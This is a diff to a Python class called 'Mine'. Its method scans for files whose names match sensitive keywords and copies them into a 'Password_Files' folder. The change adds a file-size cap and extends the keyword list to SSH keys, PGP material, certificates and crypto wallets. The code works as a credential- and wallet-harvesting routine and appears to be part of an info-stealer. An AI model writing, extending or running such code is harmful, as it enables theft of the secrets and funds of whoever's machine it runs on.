@@ -86,10 +86,14 @@ class Mine:
             - Logs error for any other copying failures
         """
         try:
+            # Check file size and permissions
+            if src_file_path.stat().st_size > 10_000_000:  # 10MB limit
+                log.warning("File exceeds size limit")
+                return
             shutil.copy(src_file_path, dst_file_path)
             log.debug(f"Copied {src_file_path} to {dst_file_path}")
         except FileExistsError as e:
-            log.warning(f"Failed to copy file due to it already existing: {e}")
+            log.warning(f"File already exists in destination: {e}")
         except Exception as e:
             log.error(f"Failed to copy file: {e}")
 
@@ -139,10 +143,7 @@ class Mine:
         This method performs a comprehensive search for files with predefined sensitive keywords in their names, 
         copying matching files to a "Password_Files" directory. It handles directory cleanup and uses predefined 
         keywords related to sensitive information.
-        
-        Parameters:
-            cls (type): The class reference, used for calling class methods.
-        
+
         Side Effects:
             - Creates or recreates the "Password_Files" directory
             - Copies files matching sensitive keywords to the destination directory
@@ -160,7 +161,7 @@ class Mine:
             - Logs an informational message upon completion of the search and copy process
         """
         keywords = ["password", "secret", "code", "login", "api", "key",
-                    "token", "auth", "credentials", "private", ]
+                    "token", "auth", "credentials", "private", "cert", "ssh", "pgp", "wallet"]
 
         # Ensure the destination directory is clean
         destination = Path("Password_Files")
